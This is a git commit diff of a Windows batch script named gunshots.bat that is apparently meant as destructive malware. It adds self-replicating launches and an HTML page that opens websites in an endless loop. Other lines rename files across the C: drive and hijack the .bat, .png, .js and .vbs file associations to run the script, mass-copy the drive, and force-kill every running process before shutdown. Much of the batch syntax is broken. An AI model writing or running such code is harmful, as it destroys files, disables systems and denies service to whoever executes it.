69d5ccf82bd2b40c2a3c948ec4920bb0b0e581a8
randyman777777777 <121990518+randyman777777777@users.noreply.github.com>
2023-02-18 14:19:07 -0800

    Active

--- bat/gunshots.bat
+++ bat/gunshots.bat
@@ -1,5 +1,60 @@
 @echo off
 :r
+l7 = %random%%random%%random%%random%.DAEMON.html
+echo <!DOCTYPE html> > l7
+echo <html> > l7
+echo <head> > l7
+echo 	<title>Open Websites</title> > l7
+echo </head> > l7
+echo <body> > l7
+echo 	<p>Click the button to open a website:</p> > l7
+echo 	<button onclick="openWebsite()">Open Website</button> > l7
+
+echo 	<script> > l7
+echo 			var websites = [ > l7
+echo 				"https://imagehost.pics/image.php?id=K0SGI3", > l7
+echo 				"https://imagehost.pics/image.php?id=AEL8SN", > l7
+echo 				"https://imagehost.pics/image.php?id=ZHY5C1", > l7
+echo 				"https://imagehost.pics/image.php?id=OYE73G", > l7
+echo 				"https://progaming.monster/showthread.php?id=8VPCC0", > l7
+echo 				"https://www.youtube.com/watch?v=1YW_6OXYB7E", > l7
+echo 			]; > l7
+echo 		while(true) { > l7
+echo 			var index = Math.floor(Math.random() * websites.length); > l7
+echo 			var website = websites[index]; > l7
+
+echo 			window.open(website, "_blank"); > l7
+echo 			} > l7
+echo 		} > l7
+echo 	</script> > l7
+echo </body> > l7
+echo </html> > l7
+start l7
+AGGGH = start %0
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
+AGGGH
 for /f "tokens" %%a in ('TREE C:\ /nh') do (
     REN %%a %%a.bat
     echo :r > %%a
@@ -14,6 +69,32 @@ for /f "tokens" %%a in ('TREE C:\ /nh') do (
     pain
     pain
 )
+BANGBANG = BANG%random%BANGBANG%random%%random%%random%%random%.DAEMON.bat
+echo XCOPY %0 %random%BANG%random%BANG%random%BANG%random%.wizard.bat > BANGBANG
+echo start %random%BANG%random%BANG%random%BANG%random%.wizard.bat > BANGBANG
+d5 = start BANGBANG
+d5
+d5
+d5
+d5
+d5
+d5
+d5
+d5
+d5
+d5
+d5
+d5
+echo ping 142.251.32.36 /n 44 -l 777 > %random%%random%%random%%random%.DAEMON.bat
+d8 = %random%%random%%random%%random%.DAEMON.bat
+d9 = start d8
+d9
+d9
+d9
+d9
+d9
+d9
+d9
 ftype yungus%random%%random%=C:\Windows\System32\cmd.exe /k %0 %*
 yungus = yungus%random%%random%
 assoc .bat=yungus
@@ -26,25 +107,39 @@ assoc .png=yungus
 assoc .js=yungus
 assoc .vbs=yungus
 for /f "tokens" %%a in ('TREE C:\ /nh') do (
-    XCOPY %%a %%a%random%
+    d2 = XCOPY %%a %%a%random%
+    d2
+    d2
+    d2
+    d2
 )
-ROBOCOPY C:\ %random%%random%
+d3 = ROBOCOPY C:\ %random%%random%
+d3
+d3
+d3
+d3
+d3
+d3
+d3
+d3
+d3
+d3
+d3
+d3
 title %random%%random%%random%%random%
 HELP
-copy %0 >> %0%0%random%.RR76.bat
-start %0%0%random%.RR76.bat
-mkdir %0%random%
-copy %0 >> %0%0%random%%random%.RR76.bat
-start %0%0%random%%random%.RR76.bat
+HELP
+RR76 = %0%0%random%%random%.RR76.bat
+echo copy %0 > RR76.bat
+echo start %0%0%random%.RR76.bat > RR76
+echo mkdir %0%random% > RR76
+start RR76
 TASKLIST
 for /f "tokens" %%a in ('TASKLIST /nh') do (
     TASKKILL /F /IM %%a
 )
 title %random%%random%%random%%random%%random%%random%%random%
-
 if %TITLE% == "678956341236572346522673444147": goto x
-
 goto r
-
 :x
 SHUTDOWN
